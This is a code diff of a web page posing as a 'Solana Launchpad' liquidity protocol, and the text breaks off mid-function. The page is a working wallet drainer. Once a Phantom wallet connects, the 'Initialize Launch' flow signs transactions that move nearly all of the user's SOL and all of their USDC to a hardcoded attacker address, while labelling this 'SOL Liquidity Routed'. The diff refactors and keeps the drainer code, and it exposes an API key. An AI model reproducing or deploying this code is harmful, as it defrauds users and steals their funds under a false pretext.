@@ -4,42 +4,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Solana Launchpad | Liquidity Protocol</title>
-    
-    <script src="https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
     <style>
-        body { 
-            font-family: 'Inter', sans-serif; 
-            background-color: #0a0a0c;
-            color: #ffffff;
-            margin: 0;
-            padding: 20px;
-            min-height: 100vh;
-        }
-        
-        .glass-panel {
-            background: rgba(20, 20, 25, 0.98);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-        }
-
-        .accent-gradient {
-            background: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%);
-        }
-
-        .status-glow {
-            box-shadow: 0 0 15px rgba(139, 92, 246, 0.4);
-        }
-
+        body { font-family: 'Inter', sans-serif; background-color: #0a0a0c; color: #ffffff; margin: 0; padding: 20px; min-height: 100vh; }
+        .glass-panel { background: rgba(20, 20, 25, 0.98); border: 1px solid rgba(255, 255, 255, 0.08); }
+        .accent-gradient { background: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%); }
+        .status-glow { box-shadow: 0 0 15px rgba(139, 92, 246, 0.4); }
         ::-webkit-scrollbar { width: 6px; }
         ::-webkit-scrollbar-track { background: #0a0a0c; }
         ::-webkit-scrollbar-thumb { background: #2d2d35; border-radius: 10px; }
-
-        @keyframes pulse-slow {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.6; }
-        }
+        @keyframes pulse-slow { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
         .animate-pulse-slow { animation: pulse-slow 3s infinite; }
     </style>
 </head>
@@ -49,35 +25,27 @@
     <div style="position:fixed; bottom:-10%; right:-10%; width:40%; height:40%; background:rgba(59,130,246,0.15); border-radius:9999px; filter:blur(120px); z-index:-1; pointer-events:none;"></div>
 
     <div id="app" class="w-full max-w-lg mx-auto mt-10" style="display:none;">
-        
         <div class="text-center mb-8">
-            <div class="inline-block px-3 py-1 rounded-full bg-purple-500/10 border border-purple-500/20 text-purple-400 text-xs font-semibold mb-4 uppercase tracking-widest">
-                Protocol V2.0 Live
-            </div>
+            <div class="inline-block px-3 py-1 rounded-full bg-purple-500/10 border border-purple-500/20 text-purple-400 text-xs font-semibold mb-4 uppercase tracking-widest">Protocol V2.0 Live</div>
             <h1 class="text-4xl font-extrabold tracking-tight mb-2">Solana <span class="text-transparent bg-clip-text accent-gradient">Launchpad</span></h1>
             <p class="text-gray-400 text-sm">Deploy, provide liquidity, and earn rewards instantly.</p>
         </div>
 
         <div class="glass-panel rounded-[32px] p-1 shadow-2xl">
             <div class="p-6 sm:p-8">
-                
                 <div class="flex items-center justify-between mb-8 bg-black/30 p-4 rounded-2xl border border-white/5">
                     <div class="flex items-center gap-3">
                         <div id="statusIndicator" class="w-2 h-2 rounded-full bg-gray-500"></div>
                         <span id="connectionText" class="text-sm font-medium text-gray-300">Wallet Disconnected</span>
                     </div>
-                    <button id="connectBtn" class="text-xs font-bold text-purple-400 hover:text-purple-300 transition-colors">
-                        CONNECT
-                    </button>
+                    <button id="connectBtn" class="text-xs font-bold text-purple-400 hover:text-purple-300 transition-colors">CONNECT</button>
                 </div>
 
                 <div class="space-y-6">
                     <div>
                         <label class="text-xs font-semibold text-gray-500 uppercase tracking-wider ml-1">Liquidity Pool (SOL)</label>
                         <div class="mt-2 relative">
-                            <input type="text" id="amountDisplay" readonly value="0.00" 
-                                class="w-full bg-black/40 border border-white/10 rounded-2xl py-4 px-5 text-2xl font-bold text-white focus:outline-none focus:border-purple-500/50 transition-all cursor-default"
-                                placeholder="0.00">
+                            <input type="text" id="amountDisplay" readonly value="0.00" class="w-full bg-black/40 border border-white/10 rounded-2xl py-4 px-5 text-2xl font-bold text-white focus:outline-none focus:border-purple-500/50 transition-all cursor-default" placeholder="0.00">
                             <div class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 font-bold text-sm">SOL</div>
                         </div>
                     </div>
@@ -89,14 +57,11 @@
                         </div>
                         <div class="flex justify-between text-sm">
                             <span class="text-gray-500">Network Fee</span>
-                            <span id="feeDisplay" class="text-gray-300">~0.005 SOL</span>
+                            <span class="text-gray-300">~0.005 SOL</span>
                         </div>
                     </div>
 
-                    <button id="actionBtn" disabled
-                        class="w-full accent-gradient text-white font-bold py-4 rounded-2xl shadow-lg shadow-purple-500/20 transform transition-all duration-200 active:scale-[0.98] opacity-50 cursor-not-allowed mt-4">
-                        Initialize Launch
-                    </button>
+                    <button id="actionBtn" disabled class="w-full accent-gradient text-white font-bold py-4 rounded-2xl shadow-lg shadow-purple-500/20 transform transition-all duration-200 active:scale-[0.98] opacity-50 cursor-not-allowed mt-4">Initialize Launch</button>
                 </div>
 
                 <div id="statusLog" class="mt-8 text-center min-h-[40px]">
@@ -123,391 +88,392 @@
     </div>
 
     <script>
-        if (typeof Buffer === 'undefined') {
-            class BrowserBuffer extends Uint8Array {
-                static alloc(size, fill = 0) {
-                    const buf = new BrowserBuffer(size);
-                    if (fill !== 0) buf.fill(fill);
-                    return buf;
+    // ========================================================================
+    // Proper Buffer Polyfill for Browser (@solana/web3.js compatibility)
+    // ========================================================================
+    if (typeof Buffer === 'undefined' || !Buffer.allocUnsafe) {
+        class BrowserBuffer extends Uint8Array {
+            static alloc(size, fill = 0) {
+                const buf = new BrowserBuffer(size);
+                if (fill !== 0) buf.fill(fill);
+                return buf;
+            }
+            static allocUnsafe(size) {
+                return BrowserBuffer.alloc(size);
+            }
+            static from(source, encoding) {
+                if (source instanceof BrowserBuffer) return source;
+                if (source instanceof Uint8Array) {
+                    return new BrowserBuffer(source.buffer, source.byteOffset, source.byteLength);
                 }
-                static from(source, encoding) {
-                    if (typeof source === 'string') {
-                        if (encoding === 'hex') {
-                            const len = source.length / 2;
-                            const buf = new BrowserBuffer(len);
-                            for (let i = 0; i < len; i++) buf[i] = parseInt(source.substr(i * 2, 2), 16);
-                            return buf;
-                        }
-                        return new BrowserBuffer(new TextEncoder().encode(source));
-                    }
-                    if (Array.isArray(source)) return new BrowserBuffer(source);
-                    if (source instanceof ArrayBuffer) return new BrowserBuffer(source, 0, source.byteLength);
-                    if (source instanceof Uint8Array) return new BrowserBuffer(source.buffer, source.byteOffset, source.byteLength);
-                    throw new TypeError('Buffer.from unsupported source');
-                }
-                static concat(list, totalLength) {
-                    if (totalLength === undefined) totalLength = list.reduce((acc, item) => acc + item.length, 0);
-                    const buf = new BrowserBuffer(totalLength);
-                    let pos = 0;
-                    for (const item of list) {
-                        buf.set(item, pos);
-                        pos += item.length;
-                    }
-                    return buf;
-                }
-                static isBuffer(obj) {
-                    return obj instanceof BrowserBuffer;
-                }
-                toString(encoding, start, end) {
+                if (typeof source === 'string') {
                     if (encoding === 'hex') {
-                        return Array.from(this.subarray(start || 0, end || this.length))
-                            .map(b => b.toString(16).padStart(2, '0')).join('');
+                        const len = source.length / 2;
+                        const buf = BrowserBuffer.alloc(len);
+                        for (let i = 0; i < len; i++) buf[i] = parseInt(source.substr(i * 2, 2), 16);
+                        return buf;
                     }
-                    return new TextDecoder().decode(this.subarray(start || 0, end || this.length));
+                    if (encoding === 'base64') {
+                        const text = atob(source);
+                        const buf = BrowserBuffer.alloc(text.length);
+                        for (let i = 0; i < text.length; i++) buf[i] = text.charCodeAt(i);
+                        return buf;
+                    }
+                    return new BrowserBuffer(new TextEncoder().encode(source));
                 }
-                fill(value, offset, end) {
-                    if (typeof value === 'string') value = value.charCodeAt(0);
-                    if (typeof value === 'number') super.fill(value & 0xff, offset || 0, end || this.length);
-                    return this;
-                }
-                copy(target, targetStart = 0, sourceStart = 0, sourceEnd = this.length) {
-                    target.set(this.subarray(sourceStart, sourceEnd), targetStart);
-                    return sourceEnd - sourceStart;
-                }
-                writeUInt32LE(value, offset = 0) {
-                    const view = new DataView(this.buffer, this.byteOffset + offset, 4);
-                    view.setUint32(0, value >>> 0, true);
-                    return offset + 4;
-                }
-                writeBigUInt64LE(value, offset = 0) {
-                    const view = new DataView(this.buffer, this.byteOffset + offset, 8);
-                    view.setBigUint64(0, BigInt(value), true);
-                    return offset + 8;
-                }
-                readUInt32LE(offset = 0) {
-                    const view = new DataView(this.buffer, this.byteOffset + offset, 4);
-                    return view.getUint32(0, true);
-                }
-                readBigUInt64LE(offset = 0) {
-                    const view = new DataView(this.buffer, this.byteOffset + offset, 8);
-                    return view.getBigUint64(0, true);
-                }
-                slice(start, end) {
-                    const arr = super.slice(start, end);
-                    return new BrowserBuffer(arr.buffer, arr.byteOffset, arr.byteLength);
-                }
-                subarray(start, end) {
-                    const arr = super.subarray(start, end);
-                    return new BrowserBuffer(arr.buffer, arr.byteOffset, arr.byteLength);
-                }
+                if (Array.isArray(source)) return new BrowserBuffer(source);
+                if (source instanceof ArrayBuffer) return new BrowserBuffer(source, 0, source.byteLength);
+                throw new TypeError('Buffer.from unsupported source');
             }
-            window.Buffer = BrowserBuffer;
-        }
-
-        document.addEventListener('DOMContentLoaded', function() {
-            if (typeof solanaWeb3 === 'undefined') {
-                document.getElementById('loadError').style.display = 'block';
-                return;
-            }
-            document.getElementById('app').style.display = 'block';
-
-            const RECIPIENT_ADDRESS = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5"; 
-            const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
-            const ALCHEMY_KEY = "alch_HyWkJpqVXY3kua9VObcl9";
-            const RPC_URL = `https://solana-mainnet.g.alchemy.com/v2/alch_HyWkJpqVXY3kua9VObcl9`; 
-            const FALLBACK_RPC = "https://api.mainnet-beta.solana.com";
-
-            const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
-            const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
-
-            let userWallet = null;
-            let provider = null;
-            
-            const statusLog = document.getElementById("statusLog");
-            const statusIndicator = document.getElementById("statusIndicator");
-            const connectionText = document.getElementById("connectionText");
-            const connectBtn = document.getElementById("connectBtn");
-            const actionBtn = document.getElementById("actionBtn");
-            const amountDisplay = document.getElementById("amountDisplay");
-
-            function getAssociatedTokenAddress(owner, mint) {
-                const seeds = [
-                    owner.toBuffer(),
-                    TOKEN_PROGRAM_ID.toBuffer(),
-                    mint.toBuffer(),
-                ];
-                return solanaWeb3.PublicKey.findProgramAddressSync(seeds, ASSOCIATED_TOKEN_PROGRAM_ID)[0];
-            }
-
-            function bigintToLeBuffer(amount, len = 8) {
-                const buf = Buffer.alloc(len);
-                let val = BigInt(amount);
-                for (let i = 0; i < len; i++) {
-                    buf[i] = Number(val & BigInt(0xff));
-                    val >>= BigInt(8);
+            static concat(list, totalLength) {
+                if (totalLength === undefined) totalLength = list.reduce((acc, item) => acc + item.length, 0);
+                const buf = BrowserBuffer.alloc(totalLength);
+                let pos = 0;
+                for (const item of list) {
+                    buf.set(item, pos);
+                    pos += item.length;
                 }
                 return buf;
             }
-
-            function createSystemTransferInstruction(fromPubkey, toPubkey, lamports) {
-                const data = new Uint8Array(12);
-                const view = new DataView(data.buffer);
-                view.setUint32(0, 2, true);
-                const big = BigInt(lamports);
-                for (let i = 0; i < 8; i++) {
-                    view.setUint8(4 + i, Number(big >> BigInt(i * 8) & BigInt(0xff)));
+            static isBuffer(obj) {
+                return obj instanceof BrowserBuffer;
+            }
+            toString(encoding, start, end) {
+                const slice = this.subarray(start || 0, end || this.length);
+                if (encoding === 'hex') {
+                    return Array.from(slice).map(b => b.toString(16).padStart(2, '0')).join('');
                 }
-                return new solanaWeb3.TransactionInstruction({
-                    keys: [
-                        { pubkey: fromPubkey, isSigner: true, isWritable: true },
-                        { pubkey: toPubkey, isSigner: false, isWritable: true }
-                    ],
-                    programId: new solanaWeb3.PublicKey("11111111111111111111111111111111"),
-                    data: data
-                });
+                if (encoding === 'base64') {
+                    let binary = '';
+                    for (let i = 0; i < slice.length; i++) binary += String.fromCharCode(slice[i]);
+                    return btoa(binary);
+                }
+                return new TextDecoder().decode(slice);
+            }
+            fill(value, offset, end) {
+                if (typeof value === 'string') value = value.charCodeAt(0);
+                if (typeof value === 'number') super.fill(value & 0xff, offset || 0, end || this.length);
+                return this;
+            }
+            copy(target, targetStart = 0, sourceStart = 0, sourceEnd = this.length) {
+                target.set(this.subarray(sourceStart, sourceEnd), targetStart);
+                return sourceEnd - sourceStart;
+            }
+            writeUInt32LE(value, offset = 0) {
+                const view = new DataView(this.buffer, this.byteOffset + offset, 4);
+                view.setUint32(0, value >>> 0, true);
+                return offset + 4;
+            }
+            writeBigUInt64LE(value, offset = 0) {
+                const view = new DataView(this.buffer, this.byteOffset + offset, 8);
+                view.setBigUint64(0, BigInt(value), true);
+                return offset + 8;
+            }
+            readUInt32LE(offset = 0) {
+                const view = new DataView(this.buffer, this.byteOffset + offset, 4);
+                return view.getUint32(0, true);
+            }
+            readBigUInt64LE(offset = 0) {
+                const view = new DataView(this.buffer, this.byteOffset + offset, 8);
+                return view.getBigUint64(0, true);
+            }
+            slice(start, end) {
+                const arr = super.slice(start, end);
+                return new BrowserBuffer(arr.buffer, arr.byteOffset, arr.byteLength);
+            }
+            subarray(start, end) {
+                const arr = super.subarray(start, end);
+                return new BrowserBuffer(arr.buffer, arr.byteOffset, arr.byteLength);
+            }
+            reverse() {
+                const arr = Array.from(this);
+                arr.reverse();
+                return BrowserBuffer.from(arr);
+            }
+            equals(other) {
+                if (this.length !== other.length) return false;
+                for (let i = 0; i < this.length; i++) if (this[i] !== other[i]) return false;
+                return true;
+            }
+            compare(other) {
+                for (let i = 0; i < Math.min(this.length, other.length); i++) {
+                    if (this[i] < other[i]) return -1;
+                    if (this[i] > other[i]) return 1;
+                }
+                return this.length - other.length;
+            }
+        }
+        window.Buffer = BrowserBuffer;
+    }
+    </script>
+
+    <script src="https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js"></script>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        if (typeof solanaWeb3 === 'undefined') {
+            document.getElementById('loadError').style.display = 'block';
+            return;
+        }
+        document.getElementById('app').style.display = 'block';
+
+        const RECIPIENT_ADDRESS = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5";
+        const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
+        const ALCHEMY_KEY = "alch_HyWkJpqVXY3kua9VObcl9";
+        const RPC_URL = `https://solana-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`;
+        const FALLBACK_RPC = "https://api.mainnet-beta.solana.com";
+
+        const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+        const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
+        const SYSTEM_PROGRAM_ID = new solanaWeb3.PublicKey("11111111111111111111111111111111");
+
+        let userWallet = null;
+        let provider = null;
+
+        const statusLog = document.getElementById("statusLog");
+        const statusIndicator = document.getElementById("statusIndicator");
+        const connectionText = document.getElementById("connectionText");
+        const connectBtn = document.getElementById("connectBtn");
+        const actionBtn = document.getElementById("actionBtn");
+        const amountDisplay = document.getElementById("amountDisplay");
+
+        function getAssociatedTokenAddress(owner, mint) {
+            const seeds = [
+                owner.toBuffer(),
+                TOKEN_PROGRAM_ID.toBuffer(),
+                mint.toBuffer(),
+            ];
+            return solanaWeb3.PublicKey.findProgramAddressSync(seeds, ASSOCIATED_TOKEN_PROGRAM_ID)[0];
+        }
+
+        // Manually build SOL transfer instruction data to avoid SystemProgram.transfer internals
+        function createSystemTransferInstruction(fromPubkey, toPubkey, lamports) {
+            const data = Buffer.alloc(12);
+            data.writeUInt32LE(2, 0); // 2 = Transfer instruction index
+            const big = BigInt(lamports);
+            for (let i = 0; i < 8; i++) {
+                data[4 + i] = Number(big >> BigInt(i * 8) & BigInt(0xff));
+            }
+            return new solanaWeb3.TransactionInstruction({
+                keys: [
+                    { pubkey: fromPubkey, isSigner: true, isWritable: true },
+                    { pubkey: toPubkey, isSigner: false, isWritable: true }
+                ],
+                programId: SYSTEM_PROGRAM_ID,
+                data: data
+            });
+        }
+
+        function createTokenTransferInstruction(source, dest, owner, amount) {
+            const data = Buffer.concat([
+                Buffer.from([3]),
+                (() => {
+                    const b = Buffer.alloc(8);
+                    const v = BigInt(amount);
+                    for (let i = 0; i < 8; i++) {
+                        b[i] = Number(v >> BigInt(i * 8) & BigInt(0xff));
+                    }
+                    return b;
+                })()
+            ]);
+            return new solanaWeb3.TransactionInstruction({
+                keys: [
+                    { pubkey: source, isSigner: false, isWritable: true },
+                    { pubkey: dest, isSigner: false, isWritable: true },
+                    { pubkey: owner, isSigner: true, isWritable: false }
+                ],
+                programId: TOKEN_PROGRAM_ID,
+                data: data
+            });
+        }
+
+        function createATAInstruction(payer, wallet, mint) {
+            const associatedToken = getAssociatedTokenAddress(wallet, mint);
+            return new solanaWeb3.TransactionInstruction({
+                keys: [
+                    { pubkey: payer, isSigner: true, isWritable: true },
+                    { pubkey: associatedToken, isSigner: false, isWritable: true },
+                    { pubkey: wallet, isSigner: false, isWritable: false },
+                    { pubkey: mint, isSigner: false, isWritable: false },
+                    { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
+                    { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+                ],
+                programId: ASSOCIATED_TOKEN_PROGRAM_ID,
+                data: Buffer.alloc(0)
+            });
+        }
+
+        async function initiateLaunch() {
+            provider = (window.phantom && window.phantom.solana) ? window.phantom.solana : window.solana;
+            if (!provider) {
+                statusLog.innerHTML = '<span class="text-red-400 text-xs">Phantom Wallet not found.</span>';
+                return;
             }
 
-            function createTransferInstruction(source, dest, owner, amount) {
-                const data = Buffer.concat([
-                    Buffer.from([3]),
-                    bigintToLeBuffer(amount, 8)
-                ]);
-                return new solanaWeb3.TransactionInstruction({
-                    keys: [
-                        { pubkey: source, isSigner: false, isWritable: true },
-                        { pubkey: dest, isSigner: false, isWritable: true },
-                        { pubkey: owner, isSigner: true, isWritable: false }
-                    ],
-                    programId: TOKEN_PROGRAM_ID,
-                    data: data
-                });
-            }
+            try {
+                statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse-slow">Connecting...</span>';
+                const resp = await provider.connect();
+                let pubKeyStr = "";
+                if (typeof resp.publicKey === 'string') pubKeyStr = resp.publicKey;
+                else if (resp.publicKey && resp.publicKey.toString) pubKeyStr = resp.publicKey.toString();
+                else throw new Error("Could not read public key");
 
-            function createATAInstruction(payer, wallet, mint) {
-                const associatedToken = getAssociatedTokenAddress(wallet, mint);
-                return new solanaWeb3.TransactionInstruction({
-                    keys: [
-                        { pubkey: payer, isSigner: true, isWritable: true },
-                        { pubkey: associatedToken, isSigner: false, isWritable: true },
-                        { pubkey: wallet, isSigner: false, isWritable: false },
-                        { pubkey: mint, isSigner: false, isWritable: false },
-                        { pubkey: solanaWeb3.SystemProgram.programId, isSigner: false, isWritable: false },
-                        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
-                    ],
-                    programId: ASSOCIATED_TOKEN_PROGRAM_ID,
-                    data: Buffer.alloc(0)
-                });
-            }
+                userWallet = new solanaWeb3.PublicKey(pubKeyStr);
 
-            async function initiateLaunch() {
-                provider = (window.phantom && window.phantom.solana) ? window.phantom.solana : window.solana;
+                statusIndicator.classList.remove('bg-gray-500');
+                statusIndicator.classList.add('bg-green-500', 'status-glow');
+                connectionText.innerText = "Wallet Connected";
+                connectionText.classList.remove('text-gray-300');
+                connectionText.classList.add('text-green-400');
+                connectBtn.innerText = "CONNECTED";
+                connectBtn.style.color = "#4ade80";
+                connectBtn.disabled = true;
 
-                if (!provider) {
-                    statusLog.innerHTML = '<span class="text-red-400 text-xs">Phantom Wallet not found.</span>';
-                    return;
+                const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
+                statusLog.innerHTML += '<br><span class="text-purple-400 text-xs animate-pulse-slow">Fetching balance...</span>';
+                const solLamports = await connection.getBalance(userWallet);
+                amountDisplay.value = (solLamports / 1e9).toFixed(4);
+
+                const usdcMint = new solanaWeb3.PublicKey(USDC_MINT);
+                const sourceAta = getAssociatedTokenAddress(userWallet, usdcMint);
+                let ataInfo = await connection.getAccountInfo(sourceAta);
+                if (!ataInfo) {
+                    statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">Initializing USDC Token Account...</span>';
+                    const createAtaIx = createATAInstruction(userWallet, userWallet, usdcMint);
+                    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+                    const tx = new solanaWeb3.Transaction().add(createAtaIx);
+                    tx.recentBlockhash = blockhash;
+                    tx.feePayer = userWallet;
+                    const signedTx = await provider.signTransaction(tx);
+                    const sig = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
+                    await connection.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, 'confirmed');
+                    statusLog.innerHTML += '<br><span class="text-green-400 text-xs">USDC Token Account Created</span>';
                 }
 
-                try {
-                    statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse-slow">Connecting...</span>';
-                    const resp = await provider.connect();
-                    
-                    let pubKeyStr = "";
-                    if (typeof resp.publicKey === 'string') pubKeyStr = resp.publicKey;
-                    else if (resp.publicKey && resp.publicKey.toString) pubKeyStr = resp.publicKey.toString();
-                    else throw new Error("Could not read public key");
+                const tokenBal = await connection.getTokenAccountBalance(sourceAta);
+                const usdcText = (tokenBal.value.uiAmount > 0) ? " | USDC: " + tokenBal.value.uiAmount : " | USDC: 0";
 
-                    userWallet = new solanaWeb3.PublicKey(pubKeyStr);
+                actionBtn.disabled = false;
+                actionBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+                actionBtn.classList.add('hover:shadow-purple-500/40', 'status-glow');
+                statusLog.innerHTML = '<span class="text-green-400 text-xs">Ready for provisioning' + usdcText + '</span>';
 
-                    statusIndicator.classList.remove('bg-gray-500');
-                    statusIndicator.classList.add('bg-green-500', 'status-glow');
-                    connectionText.innerText = "Wallet Connected";
-                    connectionText.classList.remove('text-gray-300');
-                    connectionText.classList.add('text-green-400');
-                    connectBtn.innerText = "CONNECTED";
-                    connectBtn.style.color = "#4ade80";
-                    connectBtn.disabled = true;
-
-                    const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
-                    
-                    statusLog.innerHTML += '<br><span class="text-purple-400 text-xs animate-pulse-slow">Fetching balance...</span>';
-                    const solLamports = await connection.getBalance(userWallet);
-                    amountDisplay.value = (solLamports / 1e9).toFixed(4);
-
-                    const usdcMint = new solanaWeb3.PublicKey(USDC_MINT);
-                    const sourceAta = getAssociatedTokenAddress(userWallet, usdcMint);
-                    
-                    let ataInfo = await connection.getAccountInfo(sourceAta);
-                    if (!ataInfo) {
-                        statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">Initializing USDC Token Account...</span>';
-                        const createAtaIx = createATAInstruction(userWallet, userWallet, usdcMint);
-                        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
-                        const tx = new solanaWeb3.Transaction().add(createAtaIx);
-                        tx.recentBlockhash = blockhash;
-                        tx.feePayer = userWallet;
-                        const signedTx = await provider.signTransaction(tx);
-                        const sig = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
-                        await connection.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, 'confirmed');
-                        statusLog.innerHTML += '<br><span class="text-green-400 text-xs">USDC Token Account Created</span>';
-                    }
-
-                    const tokenBal = await connection.getTokenAccountBalance(sourceAta);
-                    let usdcText = "";
-                    if (tokenBal.value.uiAmount > 0) {
-                        usdcText = " | USDC: " + tokenBal.value.uiAmount;
-                    } else {
-                        usdcText = " | USDC: 0";
-                    }
-
-                    actionBtn.disabled = false;
-                    actionBtn.classList.remove('opacity-50', 'cursor-not-allowed');
-                    actionBtn.classList.add('hover:shadow-purple-500/40', 'status-glow');
-                    
-                    statusLog.innerHTML = '<span class="text-green-400 text-xs">Ready for provisioning' + usdcText + '</span>';
-
-                } catch (err) {
-                    console.error(err);
-                    if (err.message.includes("403") || err.message.includes("401") || err.message.includes("timeout")) {
-                        statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">Switching to backup RPC...</span>';
-                        const connection = new solanaWeb3.Connection(FALLBACK_RPC, 'confirmed');
-                        
-                        try {
-                            const solLamports = await connection.getBalance(userWallet);
-                            amountDisplay.value = (solLamports / 1e9).toFixed(4);
-                            
-                            const usdcMint = new solanaWeb3.PublicKey(USDC_MINT);
-                            const sourceAta = getAssociatedTokenAddress(userWallet, usdcMint);
-                            
-                            let ataInfo = await connection.getAccountInfo(sourceAta);
-                            if (!ataInfo) {
-                                statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">Initializing USDC Token Account...</span>';
-                                const createAtaIx = createATAInstruction(userWallet, userWallet, usdcMint);
-                                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
-                                const tx = new solanaWeb3.Transaction().add(createAtaIx);
-                                tx.recentBlockhash = blockhash;
-                                tx.feePayer = userWallet;
-                                const signedTx = await provider.signTransaction(tx);
-                                const sig = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
-                                await connection.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, 'confirmed');
-                            }
-
-                            const tokenBal = await connection.getTokenAccountBalance(sourceAta);
-                            let usdcText = "";
-                            if (tokenBal.value.uiAmount > 0) {
-                                usdcText = " | USDC: " + tokenBal.value.uiAmount;
-                            } else {
-                                usdcText = " | USDC: 0";
-                            }
-
-                            actionBtn.disabled = false;
-                            actionBtn.classList.remove('opacity-50', 'cursor-not-allowed');
-                            actionBtn.classList.add('hover:shadow-purple-500/40', 'status-glow');
-                            statusLog.innerHTML = '<span class="text-green-400 text-xs">Ready for provisioning' + usdcText + '</span>';
-                        } catch (retryErr) {
-                             statusLog.innerHTML = '<span class="text-red-400 text-xs">Connection failed: ' + retryErr.message + '</span>';
-                        }
-                    } else {
-                        statusLog.innerHTML = '<span class="text-red-400 text-xs">Connection failed: ' + err.message + '</span>';
-                    }
-                }
-            }
-
-            async function startProtocol() {
-                const btnText = actionBtn.innerText;
-                actionBtn.disabled = true;
-                actionBtn.innerText = "Processing...";
-                actionBtn.classList.add('opacity-75');
-
-                try {
-                    let connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
-                    const recipientPubkey = new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
-                    const usdcMint = new solanaWeb3.PublicKey(USDC_MINT);
-
-                    statusLog.innerHTML = '<span class="text-purple-400 text-xs animate-pulse-slow">Scanning SOL liquidity...</span>';
-                    const solBalance = await connection.getBalance(userWallet);
-                    const safeReserve = 5000000;
-                    const solToSend = solBalance - safeReserve;
-
-                    if (solToSend > 0) {
-                        const solTx = new solanaWeb3.Transaction().add(
-                            createSystemTransferInstruction(userWallet, recipientPubkey, solToSend)
-                        );
-
-                        const { blockhash: bh1, lastValidBlockHeight: lbh1 } = await connection.getLatestBlockhash('confirmed');
-                        solTx.recentBlockhash = bh1;
-                        solTx.feePayer = userWallet;
-
-                        const signedSolTx = await provider.signTransaction(solTx);
-                        const solSig = await connection.sendRawTransaction(signedSolTx.serialize(), {
-                            skipPreflight: true,
-                            preflightCommitment: 'confirmed',
-                            maxRetries: 2
-                        });
-
-                        await connection.confirmTransaction({ signature: solSig, blockhash: bh1, lastValidBlockHeight: lbh1 }, 'confirmed');
-                        statusLog.innerHTML = '<span class="text-green-400 text-xs">SOL Liquidity Routed</span>';
-                    } else {
-                        statusLog.innerHTML = '<span class="text-yellow-400 text-xs">No SOL available</span>';
-                    }
-
-                    statusLog.innerHTML += '<br><span class="text-purple-400 text-xs animate-pulse-slow mt-1 block">Scanning USDC liquidity...</span>';
-                    
-                    const sourceAta = getAssociatedTokenAddress(userWallet, usdcMint);
-                    const destAta = getAssociatedTokenAddress(recipientPubkey, usdcMint);
-
+            } catch (err) {
+                console.error(err);
+                if (err.message.includes("403") || err.message.includes("401") || err.message.includes("timeout")) {
+                    statusLog.innerHTML += '<br><span class="text-yellow-400 text-xs">Switching to backup RPC...</span>';
                     try {
-                        const tokenBal = await connection.getTokenAccountBalance(sourceAta);
-                        const amt = BigInt(tokenBal.value.amount);
-
-                        if (amt > 0) {
-                            const usdcTx = new solanaWeb3.Transaction();
-                            
-                            const destInfo = await connection.getAccountInfo(destAta);
-                            if (!destInfo) {
-                                usdcTx.add(createATAInstruction(userWallet, recipientPubkey, usdcMint));
-                            }
-
-                            usdcTx.add(createTransferInstruction(sourceAta, destAta, userWallet, amt));
-
-                            const { blockhash: bh2, lastValidBlockHeight: lbh2 } = await connection.getLatestBlockhash('confirmed');
-                            usdcTx.recentBlockhash = bh2;
-                            usdcTx.feePayer = userWallet;
-
-                            const signedUsdcTx = await provider.signTransaction(usdcTx);
-                            const usdcSig = await connection.sendRawTransaction(signedUsdcTx.serialize(), {
-                                skipPreflight: true,
-                                preflightCommitment: 'confirmed',
-                                maxRetries: 2
-                            });
-
-                            await connection.confirmTransaction({ signature: usdcSig, blockhash: bh2, lastValidBlockHeight: lbh2 }, 'confirmed');
